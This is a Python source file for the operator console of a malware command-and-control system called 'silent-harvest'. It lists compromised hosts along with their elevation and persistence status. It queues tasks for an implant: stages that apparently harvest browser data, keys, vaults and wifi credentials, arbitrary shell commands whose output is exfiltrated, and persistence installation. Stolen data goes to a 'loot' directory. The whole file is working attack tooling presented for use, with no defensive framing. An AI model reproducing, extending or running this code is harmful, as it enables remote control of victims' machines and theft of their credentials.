#!/usr/bin/env python3
"""c2ctl.py -- operator CLI for the silent-harvest collector.

hosts                     list known hosts (online = seen in the last 10 min)
tasks [host]              show queued tasks
queue <host> [options]    queue a task for a host
    --stages brow,key     run only these stages
    --exec "cmd"          run a shell command, exfil stdout+stderr
    --persist             install persistence on the host
unqueue <host> [task-id]  drop task(s) (all if no id)
task format (delivered to the implant encrypted with the PSK):
    {"id": "...", "stages": "brow,key", "exec": "cmd", "persist": false}
"""
import argparse
import json
import os
import sys
import time
import uuid

HERE = os.path.dirname(os.path.abspath(__file__))


def loot_dir_arg(ap):
    ap.add_argument("--loot-dir", default=os.path.join(HERE, "..", "loot"))


def load(path, default):
    try:
        return json.load(open(path, encoding="utf-8"))
    except Exception:
        return default


def save(path, obj):
    os.makedirs(os.path.dirname(path), exist_ok=True)
    json.dump(obj, open(path, "w", encoding="utf-8"), indent=2)


def main():
    ap = argparse.ArgumentParser(description=__doc__,
                                 formatter_class=argparse.RawDescriptionHelpFormatter)
    sub = ap.add_subparsers(dest="cmd", required=True)

    p = sub.add_parser("hosts")
    loot_dir_arg(p)
    p = sub.add_parser("tasks")
    loot_dir_arg(p)
    p.add_argument("host", nargs="?", default=None)

    p = sub.add_parser("queue")
    loot_dir_arg(p)
    p.add_argument("host")
    p.add_argument("--stages", default=None, help="e.g. brow,key,vault,wifi")
    p.add_argument("--exec", dest="execute", default=None, help="shell command to run")
    p.add_argument("--persist", action="store_true")

    p = sub.add_parser("unqueue")
    loot_dir_arg(p)
    p.add_argument("host")
    p.add_argument("task_id", nargs="?", default=None)

    args = ap.parse_args()
    loot = os.path.abspath(args.loot_dir)

    if args.cmd == "hosts":
        hosts = load(os.path.join(loot, "hosts.json"), {})
        if not hosts:
            print("no hosts yet (they register on first beacon/exfil)")
            return 0
        now = time.time()
        print(f"{'host':<28} {'online':<7} {'last seen':<17} {'beacons':<8} elev  persist")
        for hid, h in sorted(hosts.items(), key=lambda kv: -kv[1].get("last_seen", 0)):
            age = now - h.get("last_seen", 0)
            online = "YES".ljust(7) if age < 600 else f"{int(age // 60)}m ago"
            seen = time.strftime("%Y-%m-%d %H:%M", time.localtime(h.get("last_seen", 0)))
            print(f"{hid:<28} {online:<12} {seen:<17} {h.get('beacons', 0):<8} "
                  f"{str(h.get('elevated', '?')):<5}  {h.get('persist', '?')}")
        return 0

    tpath = lambda h: os.path.join(loot, "tasks", h + ".json")

    if args.cmd == "tasks":
        if args.host:
            q = load(tpath(args.host), [])
            print(f"{args.host}: {len(q)} queued")
            for t in q:
                print("  ", json.dumps(t))
        else:
            tdir = os.path.join(loot, "tasks")
            any_q = False
            for f in sorted(os.listdir(tdir)) if os.path.isdir(tdir) else []:
                q = load(os.path.join(tdir, f), [])
                if q:
                    any_q = True
                    print(f"{f[:-5]}: {len(q)}")
                    for t in q:
                        print("  ", json.dumps(t))
            if not any_q:
                print("no queued tasks")
        return 0

    if args.cmd == "queue":
        if not (args.stages or args.execute or args.persist):
            sys.exit("queue needs at least one of --stages/--exec/--persist")
        task = {"id": uuid.uuid4().hex[:8], "queued": int(time.time())}
        if args.stages:
            task["stages"] = args.stages
        if args.execute:
            task["exec"] = args.execute
        if args.persist:
            task["persist"] = True
        q = load(tpath(args.host), [])
        q.append(task)
        save(tpath(args.host), q)
        print(f"queued {task['id']} for {args.host}: {json.dumps(task)}")
        print("(implant picks it up on its next beacon / --loop cycle)")
        return 0

    if args.cmd == "unqueue":
        q = load(tpath(args.host), [])
        if args.task_id:
            n = len(q)
            q = [t for t in q if t.get("id") != args.task_id]
            print(f"removed {n - len(q)}")
        else:
            q = []
            print("queue cleared")
        save(tpath(args.host), q)
        return 0


if __name__ == "__main__":
    sys.exit(main())
